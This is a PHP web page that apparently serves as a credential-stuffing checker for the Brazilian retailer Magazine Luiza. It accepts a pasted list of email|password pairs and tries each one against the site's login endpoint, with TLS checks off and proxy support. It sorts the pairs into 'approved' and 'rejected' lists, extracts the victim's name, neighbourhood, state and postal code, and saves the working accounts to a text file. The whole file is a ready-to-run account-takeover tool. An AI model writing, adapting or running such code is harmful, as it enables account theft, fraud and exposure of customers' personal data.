<style>
textarea {
 width: 750px;
 height: 230px;
 text-align: center;
 resize: none;
 background-color: #272C35;
 color: #fff;
 font-size: 17px;
 border: 3px solid #69696A;
 border-radius: 20px;
 overflow: hidden;
}
panel-body {
 width: 750px;
 height: 230px;
 text-align: center;
 resize: none;
 background-color: #69696A;
 color: #fff;
 font-size: 17px;
 border: 3px solid #69696A;
 border-radius: 20px;
 overflow: hidden;
}
#cartoesdiv{
	width:500px; height: 220px;
	margin-top: 15px;
}
#testar{
	margin-top: -20px;
	font-weight: 700;
	width: 450px;
}
#cartoes{
	width: 460px; height: 150px;
	resize: none;

}
#reprovadasdiv{
	float: right;
    width:45%;
	background: #69696A;
	
}
#aprovadasdiv{
	float: left;
	width:45%;
	background: #69696A;
		

}
#aprovadas{
	color: #3FB618;
	width:100%;
	height: 179px;
	overflow: auto;
    text-align: left;
    padding-left: 7;
    padding-top: 5;
    padding-bottom: 5;
    resize: all;
    scrollbar-base-color:#ffeaff

}
#reprovadas{
	color: #ff0039;
	width: 100%;
	height: 179px;
	overflow: auto;
    text-align: left;
    padding-left: 7;
    padding-top: 5;
    padding-bottom: 5;

}
.panel-body{

}
#headingaprov{

}
.painel{

	width:450px;
	height: 300px;
	margin-left: 25px;


}
.painel-live{
	border: 1px solid blue;

}
.panel b{
   text-align: left;
}

		</style>
<?php
$sock = '';
error_reporting(0);
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url) {
        $ch = curl_init();
		global $email, $pwd , $token;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_COOKIESESSION, true );
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/magazine.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/magazine.txt');
		curl_setopt($ch, CURLOPT_REFERER, 'Referer: https://www.magazineluiza.com.br/cliente/login/');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.($email).'&password='.($pwd));    
        }
   $data = curl_exec($ch);
        curl_close($ch);
        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url) {
        return $this->doRequest('POST', $url);
    }
}

echo '
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head>

</head>

    <script type="text/javascript">
        function pushPaypalDie(str){
            document.getElementById(\'listPaypalDie\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushPaypal(str){
            document.getElementById(\'listPaypal\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushWrongFormat(str){
            document.getElementById(\'listWrongFormat\').innerHTML += \'<div>\' + str + \'</div>\';
        }
    </script>
</head>
<body>
<center>
<h1 style="color:#A4A4A4"> Testador Magazine Luiza</h1>
</center>
<div class="main-content">
<form method="post">
<div align="center"><textarea name="mp" rows="10"  placeholder="suporte@central.com|minhasenha123" style="width:60%">';
if (isset($_POST['btn-submit']))
    echo $_POST['mp'];
else
    echo '';
;
echo '</textarea><br />
SEPARADOR: <input type="text" style="width:20px; text-align: center;" name="delim" value="';

if (isset($_POST['btn-submit']))
    echo $_POST['delim'];
else
    echo '|';
;
echo '" size="1" /><input type="hidden" name="mail" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['mail'];
else
    echo 0;
;
echo '" size="1" /><input type="hidden" name="pwd" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['pwd'];
else
    echo 1;
;
echo '" size="1" />&nbsp;

<input type="submit" class="btn btn-info" value="CHECAR" name="btn-submit" /> </br>&nbsp;&nbsp;&nbsp;&nbsp;
</div>
</div>
</form>
';
set_time_limit(0);
include("use.php");
function fetch_value($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
function fetch_value_notrim($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return substr($str, $start + $length, $end);
}
$dir = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
$zzz = "";
$live = array();
function get($list) {
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}
function delete_cookies() {
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
function xflush() {
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
  
   if ($output_handler == 'ob_gzhandler') {
        return;
    }
	
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}
function curl_grab_page($site,$proxy,$proxystatus){
	$chss = curl_init();
	curl_setopt($chss, CURLOPT_RETURNTRANSFER, TRUE);
	if ($proxystatus == 'on') {
				curl_setopt($chss, CURLOPT_SSL_VERIFYHOST, FALSE);
				curl_setopt($chss, CURLOPT_HTTPPROXYTUNNEL, TRUE);
				curl_setopt($chss, CURLOPT_PROXY, $proxy);
			}
			curl_setopt($chss, CURLOPT_COOKIEFILE, "cookie.txt");
			curl_setopt($chss, CURLOPT_URL, $site);
			return curl_exec($chss);
			curl_close ($chss);
			
}
function display($str) {
    echo '<div>' . $str . '</div>';
    xflush();
}
//function pushSockDie($str) {
   // echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';
  //  xflush();
//}
function pushPaypalDie($str) {
    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';
	file_put_contents('api/accountsdead.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushPaypal($str) {
    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';
	file_put_contents('api/accounts.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushWrongFormat($str) {
    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';
    xflush();
}

if (isset($_POST['btn-submit'])) {
    
    

    ;
    echo '<br/>
<br/>
    <center><div id="aprovadasdiv"  class="panel panel-primary"><div class="panel-heading"> <h3 class="panel-title"><b style="text-shadow: 0 0 3px black;color:black">Aprovadas <i class="glyphicon glyphicon-thumbs-up"></i></b></h3> </div><div id="listPaypal" contenteditable">
 
</div>
</div><div id="reprovadasdiv"  class="panel panel-primary"><div class="panel-heading"> <h3 class="panel-title"><b style="text-shadow: 0 0 3px black;color:black;">Reprovadas <i class="glyphicon glyphicon-thumbs-down"></i></b></h3> </div><div contenteditable id="listPaypalDie">
 
</div></div></center>
</div>

<br/>

<br/>


';
    xflush();
    $emails = explode("\n", trim($_POST['mp']));
    $eCount = count($emails);
    $failed = $live = $uncheck = array();
    $checked = 0;
    if (!count($emails)) {
    }
    delete_cookies();
    //$sockClear = isSockClear();
    //if ($sockClear != 1) {
        //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
        //continue;
    //}
    
  
    

    foreach ($emails AS $k => $line) {
        $info = explode($_POST['delim'], $line);
        $email = trim($info["{$_POST['mail']}"]);
        $pwd = trim($info["{$_POST['pwd']}"]);
        if (stripos($email, '@') === false || strlen($pwd) < 2) {
            unset($emails[$k]);
            pushWrongFormat($email . ' | ' . $pwd);
            continue;
        }
        //if ($failed[$sock] > 4)
         //   continue;
	 
	 
	 //DELETAR COOKIES
if(file_exists(getcwd().'/dafiti.txt')) {
        unlink(getcwd().'/dafiti.txt'); 
    }
	//FIM COOKIES
	
   
        
        
        
	//CHAMADAS DE TOKEN E POST
	$c = new cURL();
    $d = $c->post("https://www.magazineluiza.com.br/cliente/login.json");
	
	
	
	
$checked++;

 
	if($d){
	
	//RESULTADOS DE CAPUTRA
	
		if (stristr($d,"true") !== false) {
			$cc = getStr($d,'"state": "','",',',',',');
			$cc1 = str_replace(' \r\n\r\n\r\n','',$cc);
			$cc3 = getStr($d,'"name": "',',');
			$cc4 = str_replace(' \r\n\r\n\r\n','',$cc3);
			$cc5 = getStr($d,'"village": "','",');
			$cc6 = str_replace(' \r\n\r\n\r\n','',$cc5);
			$cc7 = getStr($d,'"addressZipCode":',',');
			$cc8 = str_replace(' \r\n\r\n\r\n','',$cc7);
			
	  
			
		
			$xyz = "<b style=\"color:green\">APROVADA ➜ </b> | <b style=\"color:black\" >$email</b> | <b style=\"color:black\">$pwd<b/> |<b style=\"color:black\"> Nome: $cc3 <b style=\"color:black\">Bairro: $cc5<b/>  Estado: $cc  <b style=\"color:black\"></b><b style=\"color:DodgerBlue\"> #CentralBlackBR</b> ";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
			
			}
			else{
				  echo'<script type="text/javascript">catapau();</script>';
			
				pushPaypalDie("<b style=\"color:red\">REPROVADA ➜ </b> => $sock | <b style=\"color:black\" >$email | $pwd </b>");
			unset($emails[$k]);
				 /* Inicio java */
            
              
                /* fim java */
			}
        
	}
	}
}
      /*           
if (isset($eCount, $live)) {

    //fimdocheck();
    display("<h3 style='text-align: center;'>Total: $eCount - Testado: $checked - Aprovado: " . count($live) . "</h3>");
 //   display(implode("<br />", $live));
}*/
    if (count($emails)) {
        display("Sem Testar:");
        display('<textarea cols="80" rows="10">' . implode("\n", $emails) . '</textarea>');
    }

echo '</body>
</html>';
?>

                
          